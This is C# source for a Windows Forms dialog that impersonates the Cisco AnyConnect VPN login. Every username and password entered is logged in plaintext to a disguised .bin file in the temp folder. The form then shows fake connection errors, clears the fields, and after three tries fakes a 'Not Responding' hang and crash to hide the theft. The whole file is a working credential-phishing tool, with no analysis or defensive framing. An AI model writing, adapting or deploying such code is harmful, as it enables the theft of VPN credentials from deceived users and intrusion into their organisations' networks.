using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace CiscoAnyConnect
{
    public partial class Form2 : Form
    {
        private string logFilePath = Path.Combine(Path.GetTempPath(), "abckdlfdpeoovnp.bin");
        private int loginAttempts = 0;
        private int clickCount = 0;
        private string commandLineArg;

        public Form2(string commandLineArg)
        {
            InitializeComponent();
   
            this.Text += commandLineArg;
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(Screen.PrimaryScreen.WorkingArea.Width - this.Width - 425, Screen.PrimaryScreen.WorkingArea.Height - this.Height - 70);

            this.button1.BringToFront();
            this.button2.BringToFront();

            textBox1.TabIndex = 0;
            textBox2.TabIndex = 1;
            button1.TabIndex = 2;
            button2.TabIndex = 3;

            //this.textBox1.Focus();
            this.textBox2.PasswordChar = '*';

            button1.Location = new Point(160, 132);
            button1.Size = new Size(75, 23);
            button2.Location = new Point(243, 132);
            button2.Size = new Size(75, 23);
        }

        private void LogToFile(string logMessage)
        {
            try
            {
                using (StreamWriter sw = File.AppendText(logFilePath))
                {
                    sw.WriteLine(logMessage);
                }
            }
            catch (Exception ex)
            {
                // exception
            }
        }

        // cancel
        private async void button2_Click(object sender, EventArgs e)
        {
            clickCount++;

            if (clickCount == 3)
            {
                this.Cursor = Cursors.WaitCursor;
                await Task.Delay(1000);
                Application.Exit();
                //this.Dispose();
            }
        }

        // OK
        private async void button1_Click(object sender, EventArgs e)
        {
            loginAttempts++;

            LogToFile($"{DateTime.Now.ToString()} - Cisco AnyConnect Username: {textBox1.Text} Password: {textBox2.Text}");

            string correctUsername = "abcdefghijklmnopqrstuvwxyz123456789";
            string correctPassword = "abcdefghijklmnopqrstuvwxyz123456789";

            if (textBox1.Text == correctUsername && textBox2.Text == correctPassword)
            {
                Application.Exit();
                //this.Dispose();
            }
            else
            {
                this.Cursor = Cursors.WaitCursor;
                await Task.Delay(1000);
                this.Enabled = false;
                //this.Cursor = Cursors.WaitCursor;
                //await Task.Delay(1000);
                SystemSounds.Exclamation.Play();
                CustomErrorBox customErrorBox1 = new CustomErrorBox("AnyConnect was not able to establish a connection to the\nspecified secure gaetway. Please try connection again.", "Cisco AnyConnect", MessageBoxIcon.Error);
                customErrorBox1.ShowDialog();
                //SystemSounds.Exclamation.Play();
                textBox1.Text = "";
                textBox2.Text = "";
                this.Cursor = Cursors.Default;
                this.Enabled = true;

                // exit or crash
                if (loginAttempts == 3)
                {
                    SetControlsEnabled(false);
                    await Task.Delay(1000);
                    this.Opacity = 0.8;
                    await Task.Delay(3000);
                    this.Text += " (Not Responding)";
                    this.Cursor = Cursors.WaitCursor;
                    await Task.Delay(5000);
                    SystemSounds.Exclamation.Play();
                    CustomErrorBox customErrorBox2 = new CustomErrorBox("\nUnknown Error.", "Cisco AnyConnect", MessageBoxIcon.Error);
                    customErrorBox2.ShowDialog();
                    Application.Exit();
                }
            }
        }
        private void SetControlsEnabled(bool enabled)
        {
            foreach (Control control in Controls)
            {
                control.Enabled = enabled;
            }
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            SystemSounds.Exclamation.Play();
            //textBox1.Focus();
        }
    }
}
